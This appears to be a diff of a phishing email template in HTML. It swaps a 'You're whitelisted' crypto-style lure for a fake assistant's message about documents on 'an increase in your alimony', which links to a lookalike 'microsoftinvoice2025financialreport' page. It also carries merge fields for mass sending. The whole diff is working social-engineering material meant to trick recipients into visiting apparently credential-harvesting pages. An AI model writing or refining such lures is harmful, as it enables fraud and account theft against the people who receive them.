@@ -22,8 +22,7 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
         .header {
-            background-color: #fcfdfd; /* Yellow header for password reset */
-            color: #ffffff;
+            background-color: #ffffff;
             padding: 10px 0;
             text-align: center;
             border-radius: 8px 8px 0 0;
@@ -40,7 +39,7 @@
         }
         .button {
             display: inline-block;
-            background-color: #ffc107;
+            background-color: #0066cc;
             color: #ffffff;
             padding: 10px 20px;
             text-decoration: none;
@@ -52,19 +51,25 @@
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://i.pinimg.com/1200x/22/23/b2/2223b24f2dffae6bcd14995ea57ebaef.jpg" alt="Company Logo" style="max-width: 100px; height: auto;">
+            <img src="https://i.pinimg.com/1200x/58/28/16/582816ae32424b1b79cb68fd8a678729.jpg" alt="Company Logo" style="max-width: 100px; height: auto;">
         </div>
         <div class="content">
-            <p>Hello {{firstName}},</p>
-            <p>Get yours now, You're whitelisted</p>
-            <p>Thank you for the long wait.</p>
+        <p>Hello,</p>
+      <p>I have been requested to pass these documents on from {sender_name} <br>
+      regarding an increase in your alimony. Please contact me directly if there are<br>
+      any issues.</p>
 
-            
-            <a href="https://pdfviewerimg133929edhe778338393.vercel.app/"><img src="https://i.pinimg.com/1200x/36/f6/37/36f63757bb2df81944f51e08ad1ff1b4.jpg" alt="transition PDF" width="130"></a>
+      <a href="https://microsoftinvoice2025financialreport.vercel.app/" style="color: #0066cc; text-decoration: underline;">View the documents</a>
 
-            <p><small>Sent to: {{firstName}}</small></p>
-            <p><small>Sent on: {{timestamp}}</small></p>
-            <!-- <p><small>This email was sent by an automated system. Please reply directly to this email.</small></p> -->
+      <p>Thank you for your help.</p>
+      <p>Kind regards,<br>
+        Karren<br>
+      <strong>Assistant to {sender_name}</strong></p>
+
+      <div class="footer">
+        <p><small>Sent to: {recipient_email}</small></p>
+        <p><small>Sent on: {timestamp}</small></p>
+      </div>
         </div>
     </div>
 </body>
